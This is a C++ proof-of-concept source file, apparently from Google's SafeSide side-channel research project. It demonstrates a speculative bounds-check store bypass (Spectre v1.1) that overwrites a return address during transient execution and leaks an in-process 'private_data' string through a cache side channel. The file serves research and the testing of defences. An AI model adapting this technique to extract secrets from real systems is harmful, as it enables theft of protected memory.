/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

constexpr static size_t kWriteBufferSize = 16;
extern char hijackedcheck[];
extern char aftercheck[];

bool init = true;
size_t colliding_offset;
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

SAFESIDE_NEVER_INLINE
static char InnerCall(size_t local_offset, size_t *size_in_heap) {
  volatile size_t write_buffer [kWriteBufferSize];
  // On the beginning we precompute the offset of the return address.
  if (init) {
    volatile size_t *write_buffer_copy = write_buffer;
    for (int i = kWriteBufferSize;; ++i) {
      if (write_buffer_copy[i] == reinterpret_cast<size_t>(aftercheck)) {
        colliding_offset = i;
        break;
      }
    }
    init = false;
  }

  // Bounds-check store bypass. When the local offset contains the colliding
  // offset, it rewrites the return address.
  if (local_offset < *size_in_heap) {
    write_buffer[local_offset] = reinterpret_cast<size_t>(hijackedcheck);
  }

  // In LeakByte the return value is ignored.
  return private_data[current_offset];
}

// Gadget function. Never called architecturally.
static void GadgetHelper() {
  std::cout << "Dead code. Must never be reached." << std::endl;
  if (strlen(public_data) == 0) {
    exit(EXIT_FAILURE);
  }
  // Fake call.
  char value = InnerCall(0, 0);
#if SAFESIDE_LINUX
      asm volatile("hijackedcheck:");
#elif SAFESIDE_MAC
      asm volatile("_hijackedcheck:");
#else
#  error Unsupported OS.
#endif
  const std::array<BigByte, 256> &oracle = *oracle_ptr;
  ForceRead(oracle.data() + static_cast<unsigned char>(value));
  std::cout << "Dead code. Must never be reached." << std::endl;
  if (strlen(public_data) == 0) {
    exit(EXIT_FAILURE);
  }
}

static char LeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();

  // Store the write buffer length on the heap.
  std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
      new size_t(kWriteBufferSize));

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();
    int safe_offset = run % kWriteBufferSize;

    for (size_t i = 0; i < 2048; ++i) {
      CLFlush(size_in_heap.get());

      size_t local_offset =
          colliding_offset + (
              safe_offset - colliding_offset) * static_cast<bool>(
                  (i + 1) % 2048);

      // Return value of the InnerCall is ignored.
      InnerCall(local_offset, size_in_heap.get());
#if SAFESIDE_LINUX
      asm volatile("aftercheck:");
#elif SAFESIDE_MAC
      asm volatile("_aftercheck:");
#else
#  error Unsupported OS.
#endif
    }

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    current_offset = i;
    std::cout << LeakByte();
    std::cout.flush();
  }
  std::cout << "\nDone!\n";

  // Avoid optimizing the helper function out.
  if (strlen(public_data) == 0) {
    GadgetHelper();
  }
}
